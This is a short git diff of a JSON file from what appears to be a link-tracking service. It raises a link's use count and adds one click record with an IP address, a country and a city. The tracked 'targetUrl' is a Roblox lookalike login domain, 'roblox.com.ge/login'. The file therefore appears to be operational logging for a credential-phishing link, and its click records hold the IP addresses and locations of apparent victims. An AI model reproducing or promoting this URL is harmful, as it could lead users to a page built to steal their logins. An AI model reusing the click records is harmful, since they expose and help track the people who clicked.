@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1544,
+    "useCount": 1545,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12520,6 +12520,14 @@
         "city": "Manolo Fortich",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777449565315,
+        "ip": "39.194.5.120",
+        "country": "Indonesia",
+        "city": "Kota Banjarmasin",
+        "flag": "🇮🇩",
+        "countryCode": "ID"
       }
     ]
   },
